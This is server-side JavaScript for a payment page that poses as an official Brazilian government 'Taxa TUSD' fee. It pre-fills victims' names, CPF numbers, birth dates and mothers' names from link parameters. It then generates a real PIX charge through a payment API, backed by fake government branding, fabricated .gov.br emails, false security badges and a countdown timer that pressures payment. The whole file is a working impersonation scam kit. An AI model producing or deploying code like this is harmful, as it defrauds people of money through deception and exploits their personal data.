const API_URL = 'https://www.pagamentos-seguros.app/api-pix/FWnY2Ki0B3ixWudFVmsTMIbwwUhS3rPIak2_nbcYArL2N9RbWrSvr7KeqOqX8vj0h8Zrn3kPk5Vr_hWxPna66w';

export default async function handler(req, res) {

  // ── LÊ PARÂMETROS DA URL ──
  const q          = req.query;
  const nome       = decodeParam(q.nome || q.name || '');
  const cpf        = (decodeParam(q.cpf || '')).replace(/\D/g, '');
  const telefone   = (decodeParam(q.telefone || '')).replace(/\D/g, '');
  const amount     = parseInt(q.amount || '0', 10); // centavos
  const nascimento = decodeParam(q.nascimento || '');
  const mae        = decodeParam(q.mae || '');
  const src        = decodeParam(q.src || '');

  const centavos    = amount > 0 ? amount : 6190;
  const valorReais  = (centavos / 100).toFixed(2).replace('.', ',');
  const pedidoId    = Math.floor(Math.random() * 90000) + 10000;
  const primeiroNome= nome.split(' ')[0] || 'Cliente';
  const email       = cpf ? `cpf${cpf}@consulta.gov.br` : `cliente${pedidoId}@consulta.gov.br`;

  let pixCode       = null;
  let transactionId = null;
  let erroApi       = null;

  // ── CHAMA DUTTYFY ──
  if (nome && cpf && centavos > 0) {
    try {
      const body = {
        amount:        centavos,
        description:   `Taxa TUSD - Protocolo #${pedidoId}`,
        customer: {
          name:     nome,
          document: cpf,
          email,
          phone:    telefone || '11999999999',
        },
        item: {
          title:    'Taxa de Serviço TUSD',
          price:    centavos,
          quantity: 1,
        },
        paymentMethod: 'PIX',
        utm: src ? `src=${src}` : '',
      };

      const apiRes = await fetch(API_URL, {
        method:  'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body:    JSON.stringify(body),
      });

      const data = await apiRes.json();
      pixCode       = data?.pixCode       ?? null;
      transactionId = data?.transactionId ?? null;

      if (!pixCode) erroApi = data?.error || 'pixCode não retornado pela API.';
    } catch (err) {
      erroApi = 'Erro de conexão com a API: ' + err.message;
    }
  } else {
    erroApi = 'Dados insuficientes. Verifique o link de acesso.';
  }

  const qrUrl = pixCode
    ? `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(pixCode)}`
    : null;

  const cpfFormatado = cpf.length === 11
    ? cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')
    : cpf;

  // ── GERA HTML ──
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.status(200).send(/* html */`<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Pagamento PIX — Taxa TUSD</title>
  <meta name="robots" content="noindex, nofollow">
  <link rel="stylesheet" href="/css/styles-Bawg5VNq.css">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    @keyframes spin   { to { transform: rotate(360deg); } }
    @keyframes pixFade{ from{opacity:0;transform:translateY(4px)} to{opacity:1;transform:translateY(0)} }
    @keyframes pulse2 { 0%,100%{box-shadow:0 0 0 0 rgba(21,128,61,.4)} 50%{box-shadow:0 0 0 6px rgba(21,128,61,0)} }
    @keyframes popIn  { from{opacity:0;transform:scale(.88)} to{opacity:1;transform:scale(1)} }
    .pix-fade { animation: pixFade .35s ease-out; }
    *{box-sizing:border-box}
    body{font-family:'Poppins',system-ui,sans-serif;background:#f5f7fa;min-height:100vh;color:#1c1c1c;margin:0;padding:0}
    header{background:#fff;border-bottom:1px solid #e2e8f0;padding:12px 16px;position:sticky;top:0;z-index:50}
    .hi{max-width:480px;margin:0 auto;display:flex;align-items:center;justify-content:space-between}
    .hl{display:flex;align-items:center;gap:10px}
    .logo{height:40px;width:auto}
    .hd{border-left:1px solid #cbd5e1;padding-left:10px}
    .hd p{margin:0}
    .hsub{font-size:11px;color:#64748b;font-weight:500}
    .hmain{font-size:13px;color:#0f172a;font-weight:700}
    .hsec{display:flex;align-items:center;gap:4px;color:#15803d;font-size:10px;font-weight:600}
    main{max-width:480px;margin:0 auto;padding:10px 14px 32px}
    .card{background:#fff;border:1px solid #e2e8f0;border-radius:12px;overflow:hidden;margin-bottom:10px}
    .cbar{background:#f8fafc;border-bottom:1px solid #e2e8f0;padding:8px 14px;display:flex;align-items:center;justify-content:space-between}
    .cbl{display:flex;align-items:center;gap:8px}
    .pbadge{width:20px;height:20px;border-radius:6px;background:#32BCAD;color:#fff;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800}
    .clabel{font-size:12px;font-weight:700;color:#0f172a}
    .cvalor{font-size:13px;color:#1351B4;font-weight:800;font-variant-numeric:tabular-nums;margin-left:4px}
    .sdot-wrap{font-size:10px;color:#15803d;font-weight:700;display:inline-flex;align-items:center;gap:4px}
    .sdot{width:6px;height:6px;border-radius:999px;background:#16a34a;animation:pulse2 1.5s ease-in-out infinite}
    .cbody{padding:14px}
    /* client box */
    .clibox{background:#f0f9ff;border:1px solid #bae6fd;border-radius:10px;padding:12px 14px;margin-bottom:14px;font-size:12px}
    .clibox-title{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:#0369a1;margin-bottom:8px;display:flex;align-items:center;gap:5px}
    .crow{display:flex;justify-content:space-between;margin-bottom:4px}
    .clabel2{color:#64748b;font-weight:500}
    .cval{color:#0f172a;font-weight:700;text-align:right;max-width:60%}
    /* aviso */
    .aviso{background:#fff7ed;border:1px solid #fde68a;border-radius:10px;padding:12px 14px;margin-bottom:14px;font-size:11px;color:#92400e;line-height:1.55;font-weight:500}
    /* valor */
    .vbox{background:#fef9c3;border:1px solid #fde047;border-radius:10px;padding:10px 14px;margin-bottom:16px;display:flex;align-items:center;justify-content:space-between}
    .vlabel{font-size:12px;font-weight:600;color:#92400e}
    .vnum{font-size:20px;font-weight:800;color:#1351B4;font-variant-numeric:tabular-nums}
    /* qr */
    .qrsec{text-align:center;margin-bottom:16px}
    .qrlabel{font-size:11px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:12px}
    .qrwrap{display:inline-block;padding:12px;background:#fff;border:2px solid #e2e8f0;border-radius:14px;box-shadow:0 2px 12px rgba(19,81,180,.1);position:relative}
    .qrwrap img{width:190px;height:190px;display:block;border-radius:6px}
    .qrc{position:absolute;width:16px;height:16px;border-color:#1351B4;border-style:solid}
    .qrc.tl{top:5px;left:5px;border-width:3px 0 0 3px;border-radius:4px 0 0 0}
    .qrc.tr{top:5px;right:5px;border-width:3px 3px 0 0;border-radius:0 4px 0 0}
    .qrc.bl{bottom:5px;left:5px;border-width:0 0 3px 3px;border-radius:0 0 0 4px}
    .qrc.br{bottom:5px;right:5px;border-width:0 3px 3px 0;border-radius:0 0 4px 0}
    /* timer */
    .tbox{display:flex;align-items:center;justify-content:center;gap:8px;background:#fff7ed;border:1px solid #fed7aa;border-radius:10px;padding:9px 14px;margin-bottom:14px;font-size:13px;font-weight:600;color:#92400e}
    .tcount{font-weight:800;color:#c2410c;font-variant-numeric:tabular-nums}
    /* divider */
    .div{display:flex;align-items:center;gap:10px;margin:14px 0;color:#94a3b8;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:1px}
    .div::before,.div::after{content:'';flex:1;height:1px;background:#e2e8f0}
    /* code */
    .clabel3{font-size:11px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:1px;margin-bottom:7px}
    .codebox{display:flex;align-items:center;gap:10px;background:#f8fafc;border:1px solid #e2e8f0;border-radius:10px;padding:10px 12px;margin-bottom:12px}
    .codetxt{flex:1;font-family:monospace;font-size:10px;color:#1e293b;word-break:break-all;line-height:1.5;max-height:52px;overflow:hidden}
    /* button */
    .btncopy{width:100%;background:#1351B4;border:none;border-radius:10px;padding:14px;font-size:14px;font-weight:700;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 3px 14px rgba(19,81,180,.35);transition:transform .15s,box-shadow .15s;font-family:'Poppins',sans-serif}
    .btncopy:hover{transform:translateY(-1px);box-shadow:0 5px 20px rgba(19,81,180,.45)}
    .btncopy:active{transform:scale(.97)}
    .btncopy.copied{background:#15803d;box-shadow:0 3px 14px rgba(21,128,61,.35)}
    /* status */
    .sbox{display:flex;align-items:center;gap:10px;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:10px;padding:10px 14px;margin-top:14px}
    .spulse{width:10px;height:10px;border-radius:50%;background:#16a34a;flex-shrink:0;animation:pulse2 1.5s ease-in-out infinite}
    .stxt{font-size:13px;font-weight:600;color:#15803d}
    /* chips */
    .chips{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin:16px 0 8px}
    .chip{font-size:10px;color:#64748b;background:#f1f5f9;border:1px solid #e2e8f0;padding:4px 10px;border-radius:999px;font-weight:600;letter-spacing:.5px}
    .ftxt{font-size:10.5px;color:#94a3b8;text-align:center;margin:0;line-height:1.5}
    /* erro */
    .errwrap{text-align:center;padding:28px 16px}
    .erricon{font-size:40px;margin-bottom:10px}
    .errtitle{font-size:15px;font-weight:700;color:#dc2626;margin-bottom:6px}
    .errmsg{font-size:13px;color:#64748b;line-height:1.5}
    /* sucesso */
    .sov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:100;align-items:center;justify-content:center;padding:16px}
    .scard{background:#fff;border-radius:20px;padding:36px 28px;text-align:center;max-width:340px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.2);animation:popIn .4s cubic-bezier(.34,1.56,.64,1);border:2px solid #bbf7d0}
    .sicon{font-size:60px;margin-bottom:12px}
    .stitle{font-size:20px;font-weight:800;color:#15803d;margin-bottom:6px}
    .ssub{font-size:13px;color:#64748b;line-height:1.6}
    @media(max-width:400px){.qrwrap img{width:160px;height:160px}}
  </style>
</head>
<body>

<header>
  <div class="hi">
    <div class="hl">
      <img src="/images/aqui-l594lK2b.png" alt="Gov" class="logo" onerror="this.style.display='none'">
      <div class="hd">
        <p class="hsub">Pagamento Oficial</p>
        <p class="hmain">Taxa TUSD · PIX</p>
      </div>
    </div>
    <div class="hsec">
      <svg width="12" height="12" viewBox="0 0 20 20" fill="currentColor">
        <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/>
      </svg>
      <span>Conexão segura</span>
    </div>
  </div>
</header>

<main>
  <div class="card">
    <div class="cbar">
      <div class="cbl">
        <div class="pbadge">P</div>
        <span class="clabel">Pagamento via PIX</span>
        <span class="cvalor">R$ ${valorReais}</span>
      </div>
      ${pixCode ? `<span class="sdot-wrap"><span class="sdot"></span>Aguardando</span>` : ''}
    </div>

    <div class="cbody pix-fade">
      ${erroApi ? `
      <div class="errwrap">
        <div class="erricon">⚠️</div>
        <div class="errtitle">Não foi possível gerar o PIX</div>
        <div class="errmsg">${erroApi}<br><br>Verifique os dados e tente novamente.</div>
      </div>
      ` : `
      ${nome || cpf ? `
      <div class="clibox">
        <div class="clibox-title">
          <svg width="10" height="10" viewBox="0 0 20 20" fill="#0369a1"><path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"/></svg>
          Dados do Requerente
        </div>
        ${nome ? `<div class="crow"><span class="clabel2">Nome:</span><span class="cval">${escHtml(nome)}</span></div>` : ''}
        ${cpf  ? `<div class="crow"><span class="clabel2">CPF:</span><span class="cval">${cpfFormatado}</span></div>` : ''}
        ${nascimento ? `<div class="crow"><span class="clabel2">Nascimento:</span><span class="cval">${escHtml(nascimento)}</span></div>` : ''}
        ${mae  ? `<div class="crow"><span class="clabel2">Mãe:</span><span class="cval">${escHtml(mae)}</span></div>` : ''}
      </div>
      ` : ''}

      <div class="aviso">
        ⚠️ <strong>Atenção:</strong> O pagamento da taxa é obrigatório para o processamento do protocolo.
        Após a confirmação, seu processo será liberado automaticamente em até <strong>2 horas úteis</strong>.
      </div>

      <div class="vbox">
        <span class="vlabel">💳 Valor a pagar</span>
        <span class="vnum">R$ ${valorReais}</span>
      </div>

      <div class="qrsec">
        <div class="qrlabel">📱 Escaneie o QR Code</div>
        <div class="qrwrap">
          <div class="qrc tl"></div><div class="qrc tr"></div>
          <div class="qrc bl"></div><div class="qrc br"></div>
          <img src="${qrUrl}" alt="QR Code PIX">
        </div>
      </div>

      <div class="tbox">
        <span>⏱</span>
        <span>PIX expira em <span class="tcount" id="timer">30:00</span></span>
      </div>

      <div class="div">ou copie o código abaixo</div>

      <div class="clabel3">📋 Copia e Cola</div>
      <div class="codebox">
        <div class="codetxt">${escHtml(pixCode.substring(0, 140))}...</div>
      </div>

      <button class="btncopy" id="btn-copy" onclick="copiarPix()">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <rect x="9" y="9" width="13" height="13" rx="2"/>
          <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
        </svg>
        <span id="btn-txt">Copiar Código PIX</span>
      </button>

      <div class="sbox">
        <div class="spulse"></div>
        <div class="stxt" id="status-txt">Aguardando confirmação do pagamento...</div>
      </div>
      `}
    </div>
  </div>

  <div class="chips">
    <span class="chip">TLS 1.3</span>
    <span class="chip">ICP-Brasil</span>
    <span class="chip">LGPD</span>
    <span class="chip">BCB · PIX</span>
  </div>
  <p class="ftxt">Detecção de pagamento automática · Esta página é atualizada em tempo real</p>
</main>

<div class="sov" id="sov">
  <div class="scard">
    <div class="sicon">✅</div>
    <div class="stitle">Pagamento Confirmado!</div>
    <div class="ssub">
      Seu pagamento de <strong>R$ ${valorReais}</strong> foi recebido com sucesso.<br>
      Obrigado, ${escHtml(primeiroNome)}!<br>
      Seu protocolo será processado em até 2 horas úteis.
    </div>
  </div>
</div>

${pixCode ? `<script>
const PIX_CODE = ${JSON.stringify(pixCode)};
const TX_ID    = ${JSON.stringify(transactionId)};
const VFY_URL  = ${JSON.stringify(API_URL + '?transactionId=' + encodeURIComponent(transactionId || ''))};
let pago = false;

async function copiarPix() {
  try { await navigator.clipboard.writeText(PIX_CODE); }
  catch { const t=document.createElement('textarea');t.value=PIX_CODE;document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t); }
  const btn=document.getElementById('btn-copy'),txt=document.getElementById('btn-txt');
  btn.classList.add('copied'); txt.textContent='✅ Código copiado!';
  setTimeout(()=>{ btn.classList.remove('copied'); txt.textContent='Copiar Código PIX'; }, 3000);
}

let totalSec=30*60;
const timerEl=document.getElementById('timer');
const timerInt=setInterval(()=>{
  if(pago){clearInterval(timerInt);return;}
  totalSec--;
  if(totalSec<=0){timerEl.textContent='00:00';clearInterval(timerInt);return;}
  timerEl.textContent=String(Math.floor(totalSec/60)).padStart(2,'0')+':'+String(totalSec%60).padStart(2,'0');
},1000);

async function verificar(){
  if(pago||!TX_ID)return;
  try{
    const r=await fetch(VFY_URL);
    const d=await r.json();
    if(d.status==='COMPLETED'||d.status==='PAID'){
      pago=true;
      clearInterval(timerInt);clearInterval(chkInt);
      document.getElementById('status-txt').textContent='✅ Pagamento confirmado!';
      document.getElementById('sov').style.display='flex';
    }
  }catch{}
}
const chkInt=setInterval(verificar,4000);
<\/script>` : ''}

<script defer src="/js/~flock.js" data-proxy-url="/~api/analytics"></script>
</body>
</html>`);
}

function decodeParam(val) {
  try { return decodeURIComponent(String(val)).trim(); }
  catch { return String(val).trim(); }
}

function escHtml(str) {
  return String(str)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;')
    .replace(/'/g,'&#39;');
}
